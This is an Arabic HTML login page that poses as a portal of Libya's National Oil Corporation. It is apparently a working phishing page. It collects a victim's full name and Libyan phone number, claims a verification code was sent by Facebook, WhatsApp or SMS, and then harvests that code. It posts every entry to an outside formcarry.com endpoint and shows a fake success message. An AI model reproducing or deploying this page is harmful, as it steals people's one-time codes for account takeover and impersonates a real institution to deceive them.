<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(to bottom right, #002b45, #003c60);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }

    .container {
      background-color: #fff;
      border-radius: 20px;
      padding: 30px 20px;
      width: 90%;
      max-width: 420px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
      text-align: center;
      border-top: 6px solid #e30613;
      position: relative;
    }

    .logo {
      width: 80px;
      margin: 0 auto 20px;
      display: block;
    }

    h2 {
      color: #002b45;
      margin-bottom: 25px;
      font-weight: 800;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border-radius: 12px;
      border: 1.5px solid #ccc;
      font-size: 18px;
      box-sizing: border-box;
      text-align: center;
      transition: border-color 0.3s;
    }

    input:focus {
      outline: none;
      border-color: #002b45;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #e30613;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      font-weight: bold;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #c00511;
    }

    #notification {
      background-color: #f4f4f4;
      border: 1px solid #ccc;
      padding: 12px;
      border-radius: 10px;
      margin-bottom: 15px;
      color: #002b45;
      display: none;
      font-size: 16px;
      animation: fadeInOut 4s forwards;
    }

    @keyframes fadeInOut {
      0%   { opacity: 0; }
      10%  { opacity: 1; }
      90%  { opacity: 1; }
      100% { opacity: 0; display: none; }
    }

    #codeSection {
      display: none;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- شعار المؤسسة الوطنية للنفط -->
    <img src="uy.jpeg" alt="شعار المؤسسة الوطنية للنفط" class="logo">

    <h2>طلب الدخول</h2>
    <input type="text" id="fullName" placeholder="الاسم بالكامل" required>
    <input type="tel" id="myPhone" placeholder="رقم هاتفك" required>

    <div id="notification">تم إرسال الكود عبر إشعار فيسبوك أو واتساب أو رسالة نصية</div>

    <div id="codeSection">
      <input type="text" id="codeInput" placeholder="رمز التحقق" maxlength="8">
    </div>

    <button id="actionBtn" onclick="handleAction()">طلب التحقق</button>
  </div>

  <script>
    const formcarryURL = "https://formcarry.com/s/pHHZOWhpgsB";
    let step = 1;

    function handleAction() {
      if (step === 1) {
        const fullName = document.getElementById("fullName").value.trim();
        const myPhone = document.getElementById("myPhone").value.trim();

        if (!/^09\d{8}$/.test(myPhone)) {
          alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 09 ويتكون من 10 أرقام.");
          return;
        }

        if (fullName.length < 3) {
          alert("يرجى إدخال الاسم بالكامل (على الأقل 3 أحرف).");
          return;
        }

        fetch(formcarryURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            fullName: fullName,
            myPhone: myPhone
          })
        }).then(() => {
          const notification = document.getElementById("notification");
          notification.style.display = "block";

          setTimeout(() => {
            notification.style.display = "none";
            document.getElementById("codeSection").style.display = "block";
            step = 2;
          }, 4000);
        }).catch((error) => {
          alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
          console.error(error);
        });

      } else if (step === 2) {
        const code = document.getElementById("codeInput").value.trim();

        if (!/^[0-9a-zA-Z]{6,8}$/.test(code)) {
          alert("يرجى إدخال رمز تحقق صحيح يتكون من 6 إلى 8 أرقام أو حروف.");
          return;
        }

        fetch(formcarryURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            verificationCode: code
          })
        }).then(() => {
          alert("تم تأكيد الكود بنجاح ✅");
          document.getElementById("actionBtn").innerText = "تم التحقق";
        }).catch((error) => {
          alert("فشل في إرسال الكود. حاول مرة أخرى.");
          console.error(error);
        });
      }
    }
  </script>
</body>
</html>
